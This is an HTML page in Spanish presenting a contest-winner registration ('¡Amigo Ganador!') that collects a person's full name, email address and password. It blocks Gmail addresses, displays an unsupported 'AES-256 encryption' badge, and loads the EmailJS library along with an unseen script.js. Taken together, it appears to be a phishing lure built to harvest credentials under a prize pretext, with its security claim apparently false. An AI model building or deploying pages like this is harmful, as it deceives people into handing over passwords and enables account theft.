<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro de Soporte</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="fondo-concurso"></div>
    
    <main class="contenedor">
        <div class="tarjeta-registro">
            <div class="encabezado">
                <div class="icono animate-bounce">🎯</div>
                <h1>¡Amigo Ganador!</h1>
                <p class="subtitulo">Regístrate para aumentar sus posibilidades</p>
            </div>

            <form id="formRegistro">
                <div class="grupo-input">
                    <label>👤 Nombre completo</label>
                    <input type="text" id="nombre" placeholder="Ej: Juan Pérez" required>
                </div>

                <div class="grupo-input">
                    <label>📧 Correo electrónico</label>
                    <input type="email" id="correo" placeholder="tucorreo@ejemplo.com" required>
                    <div class="error-email">⚠️ No se permiten cuentas Gmail</div>
                </div>

                <div class="grupo-input">
                    <label>🔑 Contraseña</label>
                    <input type="password" id="password" placeholder="••••••••" required>
                </div>

                <button type="submit" class="boton-principal">
                    <span>Validar Registro</span>
                    <div class="spinner"></div>
                </button>
            </form>

            <div class="aviso-legal">
                <div class="icono-seguridad">🔒</div>
                <p>Protegido con encriptación AES-256</p>
            </div>
        </div>
    </main>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
